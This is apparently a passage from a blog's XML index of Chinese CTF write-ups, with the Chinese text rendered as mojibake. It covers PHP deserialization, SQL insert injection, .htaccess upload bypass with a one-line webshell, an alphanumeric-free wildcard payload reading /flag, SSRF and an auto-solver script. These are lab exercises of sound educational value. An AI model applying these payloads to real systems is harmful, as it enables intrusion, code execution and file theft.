ä¸Š<code>()</code>å³å¯è°ƒç”¨å‡½æ•°ï¼›ä½†æ˜¯<code>eval</code>å¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ˜¯PHPè¯­æ³•ç»“æ„çš„ä¸€éƒ¨åˆ†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>getshell</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </title>
    <link href="/2021/05/15/BUU86/"/>
    <url>/2021/05/15/BUU86/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>é¢˜ç›®è¯´ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œçœ‹ä¸€ä¸‹<code>www.zip</code>   </p><p>æ²¡æœ‰ï¼Ÿï¼Ÿ</p><p>çœ‹äº†WPï¼Œæ˜¯<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>ä¸Šæœç´¢å¾—åˆ°æºç <img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>ä¸»è¦æ˜¯<code>helper.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);        $array = <span class="hljs-keyword">array</span>();        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);        &#125;        <span class="hljs-keyword">return</span> $rs;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span><span class="hljs-function">    </span>&#123;        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);        &#125;        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con))         &#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());        &#125;        $sql_fields = <span class="hljs-keyword">array</span>();        $sql_val = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;        &#125;        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>        &#125;        $content = file_get_contents($path);        <span class="hljs-keyword">echo</span> $content;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment"># Read some config html</span>        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>æœ€åçš„è¿™é‡Œå¯ä»¥åˆ©ç”¨<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç„¶åæ˜¯sql <code>insert </code> æ³¨å…¥   </p><p>æ­£å¸¸ä¸Šä¼ å›¾ç‰‡çš„sqlè¯­å¥ä¸º<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIMæˆªå›¾20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>å…¶ä¸­titleæ²¡æœ‰åšä»€ä¹ˆå¤„ç†<br>æ‰€ä»¥æ„é€ <code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>æ–‡ä»¶åä¸èƒ½æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç     </p><p>ä¸Šä¼ å›¾ç‰‡ï¼Œç”¨burpæ”¹ä¸€ä¸‹æ–‡ä»¶åï¼Œåœ¨<code>show.php</code>å¾—åˆ°flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>serialize</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wicctf</title>
    <link href="/2021/05/11/wicctf/"/>
    <url>/2021/05/11/wicctf/</url>
    
    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜<br>ç»™äº†æºç ï¼Œå…¶ä¸­æœ‰äº›é…ç½®æ–‡ä»¶çœ‹ä¸æ‡‚ï¼Œæ”¾å¼ƒäº†   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>ä¸€å¼€å§‹ä¸Šä¼ PHPæ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸäº†ï¼Œä½†è®¿é—®è¿”å›äº†æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰è§£æPHPæ–‡ä»¶     </p><p>è¿™æ—¶å€™å°±åº”è¯¥æ‰¾apacheä¸­çš„ç›¸å…³é…ç½®äº†    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>è¿™ä¸ªè®¾ä¸ºäº†<code>off</code>ä¼šé™åˆ¶ç›®å½•ä¸‹çš„PHPæ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>é€šè¿‡ä¼ å…¥<code>.htaccess</code>æ–‡ä»¶æ¥è¦†ç›–é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®ï¼ˆ<code>.htaccess</code>æ–‡ä»¶ä½œç”¨æ‰€åœ¨çš„ç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ï¼ŒæŒ‡ä»¤æŒ‰æŸ¥æ‰¾é¡ºåºä¾æ¬¡ç”Ÿæ•ˆï¼Œæ‰€ä»¥å­ç›®å½•ä¸‹çš„<code>.htaccess</code>å¯èƒ½ä¼šè¦†ç›–çˆ¶ç›®å½•ä¸‹æˆ–è€…é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼‰      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>æ ‡ç­¾æ¯”<code>&lt;directory&gt;</code>ä¼˜å…ˆçº§é«˜     </p><p>ç„¶åä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶åç¼€åæ”¹ä¸º<code>.gif</code>      </p><p>èšå‰‘è¿ä¸Šä¹Ÿæ²¡ç”¨ï¼Œæœ‰<code>disable_function</code>,è®¿é—®ä¸€å¥è¯æ–‡ä»¶<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>å¯ä»¥<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>phpä»£ç å®¡è®¡   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>);     &#125;    <span class="hljs-keyword">eval</span>($code);&#125;</code></pre></code></pre><p>è¿‡æ»¤äº†å­—æ¯æ•°å­—è¿˜æœ‰<code>_@$</code>    </p><p>è¯•äº†ä¸‹å¼‚æˆ–ï¼Œä¸è¡Œï¼›urlå–åä¹Ÿä¸è¡Œï¼Œå°±æ²¡æ‹›äº†â€¦â€¦.      </p><p><code>é€šé…ç¬¦</code><br><code>/bin/cat /flag</code>â€”â€”-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡â€”Pç¥</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>åœç”µäº†ä¼šå‘ç”Ÿä»€ä¹ˆ    </p><p>æœªå®Œæˆçš„æ–‡ä»¶ï¼Œæç¤º<code>swp</code>æ³„éœ²ï¼Œå½“æ—¶çœ‹åˆ°è¿™å¥è¯æ²¡å•¥æ„Ÿè§‰ï¼Œæ‰¾äº†æ‰¾å…¶ä»–ä¹Ÿæ²¡å•¥ï¼Œå°±å»æ‰«ç›®å½•äº†      </p><p>æ‰«åˆ°<code>.index.php.swp</code>       </p><p>swpæ–‡ä»¶æ‹–åˆ°Linuxå›å¤ä¸€ä¸‹<code>vi -r .index.php.swp</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;        <span class="hljs-comment">// initialise variables</span>        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);            &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);        fclose($fd);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;    <span class="hljs-keyword">public</span> $weblogfile;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);        <span class="hljs-keyword">return</span> $str;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);$log_unser = unserialize($log);<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;&lt;br/&gt;æ˜¨å¤©æ™šä¸Šå› ä¸º<span class="hljs-number">14</span>çº§å¤§é£åœç”µäº†.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p><code>readfile</code>  ã€ flagåœ¨<code>/flag</code>      </p><p>é“¾<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>åªè¦å°†<code>$weblogfile=&#39;/flag&#39;</code>å³å¯       </p><p>flagè¿‡æ»¤äº†ï¼ŒåŒå†™å³å¯ç»•è¿‡    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> weblog();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>payloadï¼š<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);    session_start();    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span>($url)    &#123;    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)        &#123;            <span class="hljs-keyword">exit</span>();        &#125;            $ch = curl_init();            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_exec($ch);            curl_close($ch);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>SSRF    </p><p><code>åˆ©ç”¨gopheråè®®æ”»å‡»å·²çŸ¥ç”¨æˆ·åæ— å¯†ç çš„Mysql</code>  </p><p>ç®—äº†ï¼Œç¯å¢ƒä¹Ÿå…³äº†ï¼Œé™„ä¸Š<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">å®¸æå®éªŒå®¤çš„WP</a>    </p><p>è¿˜æœ‰ä¸€é“GOè¯­è¨€çš„é¢˜â€¦â€¦.å®Œå…¨ä¸æ‡‚â€¦..</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>wicctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>wicctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>StrongestMind</title>
    <link href="/2021/05/10/BUU85/"/>
    <url>/2021/05/10/BUU85/</url>
    
    <content type="html"><![CDATA[<h2 id="PY"><a href="#PY" class="headerlink" title="PY"></a>PY</h2><p>æ‰“å¼€ç¯å¢ƒ </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1dc.png"></p><p>pythonè„šæœ¬      </p><p>è¿˜ä¸ä¼šå†™ï¼Œç ”ç©¶ä¸‹å¤§ä½¬çš„      </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span>():</span>    s = requests.session()       <span class="hljs-comment">#ä¼šè¯ä¿æŒ</span>    url = <span class="hljs-string">&#x27;http://ee15b87d-2094-4459-97e9-6c7d3f88800d.node3.buuoj.cn/&#x27;</span>    match = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)  <span class="hljs-comment">#æ­£åˆ™åŒ¹é…   +ï¼šåŒ¹é…å‰é¢çš„è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡</span>    r = s.get(url)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):        sleep(<span class="hljs-number">0.1</span>)        <span class="hljs-built_in">str</span> = match.findall(r.text)[<span class="hljs-number">0</span>]        print(<span class="hljs-built_in">str</span>)        <span class="hljs-comment"># print(eval(str))</span>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span> : <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)&#125;   <span class="hljs-comment">#evalæ‰§è¡Œ</span>        r = s.post(url, data=data)        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span>        print(<span class="hljs-string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)))        <span class="hljs-comment"># print(r.text)</span>    print(r.text)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    count()</code></pre></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>python</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ezaudit</title>
    <link href="/2021/05/08/BUU84/"/>
    <url>/2021/05/08/BUU84/</url>
    
    <content type="html"><![CDATA[<h2 id="0"><a href="#0" class="headerlink" title="-0-)"></a>-0-)</h2><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e304316d-4424-4850-b53e-7392e0c5c05e.png" alt="01.png">     </p><p>é¢˜ç›®æ‰“å¼€æ˜¯è¿™æ ·ï¼ŒæŒºæ­£ç»çš„ï¼Œä»¥ä¸ºæ˜¯ä»€ä¹ˆæ¼æ´ï¼Œæºç ä¸­ä¹Ÿæ²¡æœ‰æç¤º     </p><p>çœ‹ä¸€çœ¼é¢˜ç›®å<code>Ezaudit</code>ç®€å•çš„å®¡è®¡     </p><p>å“¦   </p><p><code>www.zip</code>  </p><p>æœç„¶   </p><p>ä¸‹è½½ä¸‹æ¥æ˜¯<code>index.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;        <span class="hljs-comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;        <span class="hljs-keyword">exit</span>;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )    &#123;        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;        <span class="hljs-keyword">exit</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>;         $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);        $result = mysql_query($getuser);        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span 